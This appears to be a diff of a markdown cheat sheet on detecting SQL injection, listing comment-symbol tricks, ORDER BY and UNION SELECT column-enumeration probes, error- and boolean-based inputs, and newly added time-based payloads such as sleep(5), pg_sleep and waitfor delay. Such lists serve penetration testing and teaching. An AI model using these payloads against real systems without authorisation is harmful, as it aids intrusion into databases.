@@ -1,9 +1,9 @@
 <h1>SQL injection detection</h1>
 
 # IN BAND (Classic)
+###########################################################################################################
 
 # UNION BASED
-
 
 "--" Symbol Alternative
 ```
@@ -12,7 +12,7 @@
 /* 	Block comment
 */ 	Block comment
 ```
-# Column enumeration 
+Column enumeration 
 
 ======================================================================================================================================================================
 Method 1
@@ -27,7 +27,8 @@ ORDER BY 7 --+
 ORDER BY 8 --+
 ORDER BY 9 --+
 ORDER BY 10 --+
-ORDER BY 11 --+.....
+ORDER BY 11 --+
+.....
 ```
 
 =======================================================================================================================================================================
@@ -47,7 +48,8 @@ UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
-UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+ ......................................
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --+
+...
 ```
 ==================================================================================================================
 
@@ -65,6 +67,7 @@ UNION SELECT 1,2,3,4,5,6,7,8 --+
 UNION SELECT 1,2,3,4,5,6,7,8,9 --+
 UNION SELECT 1,2,3,4,5,6,7,8,9,10 --+
 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --+ ..........................................................................
+..........
 ```
 
 ==========================================================================================================================
@@ -83,6 +86,7 @@ ERROR BASED
 \
 \\
 ;
+...
 ```
 BOOLEAN BASED
 ```
@@ -95,10 +99,15 @@ BOOLEAN BASED
 1=2
 1>2
 3
+.....
 ```
 TİME BASED
 ```
-
+sleep(5)
+pg_sleep(5)
+waitfor delay '0:0:5'
+BENCHMARK(10000000,rand())
+....
 ```
 Other Resources:
 https://www.w3schools.com/sql/sql_comments.asp
